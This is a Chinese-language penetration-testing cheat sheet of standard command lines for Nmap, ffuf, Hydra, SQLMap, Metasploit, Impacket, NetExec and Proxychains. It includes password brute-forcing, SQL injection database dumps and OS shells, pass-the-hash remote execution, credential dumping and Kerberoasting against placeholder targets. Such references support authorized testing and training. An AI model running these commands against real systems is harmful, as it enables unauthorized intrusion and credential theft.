# 工具命令速查

## Nmap

```bash
nmap -sn 192.168.1.0/24
nmap -sS -p- -T4 -Pn target
nmap -sV -sC -p 22,80,443,445,3306,6379 target
nmap -A -Pn target
```

## FFuf / dirsearch

```bash
ffuf -u http://target/FUZZ -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://target -H 'Host: FUZZ.target' -w subdomains.txt -mc all -fs 0

dirsearch -u http://target -e php,html,js,txt,bak,zip
```

## Hydra

```bash
hydra -l admin -P pass.txt ssh://target
hydra -L users.txt -P pass.txt smb://target
hydra -l admin -P pass.txt target rdp
```

## SQLMap

```bash
sqlmap -u 'http://target/?id=1' --batch --dbs
sqlmap -u 'http://target/?id=1' -D db -T users -C username,password --dump
sqlmap -u 'http://target/?id=1' --os-shell
sqlmap -r request.txt -p id --level 5 --risk 3
```

## Metasploit

```text
msfconsole

show options

set LHOST 10.10.10.10
run
sessions -l
sessions -i <id>
```

## Impacket

```bash
impacket-wmiexec user@target -hashes :<hash>
impacket-psexec user@target -hashes :<hash>
impacket-secretsdump domain/user:password@target
impacket-GetUserSPNs domain/user:password -dc-ip dc -request
```

## NetExec / CrackMapExec

```bash
nxc smb 192.168.1.0/24
nxc smb target -u user -p password
nxc smb target -u user -p password --shares
nxc smb target -u user -H <hash> -x 'whoami'
```

## Proxychains

```bash
proxychains4 curl http://172.16.0.10/
proxychains4 nmap -sT -Pn 172.16.0.0/24
proxychains4 sqlmap -r request.txt
```
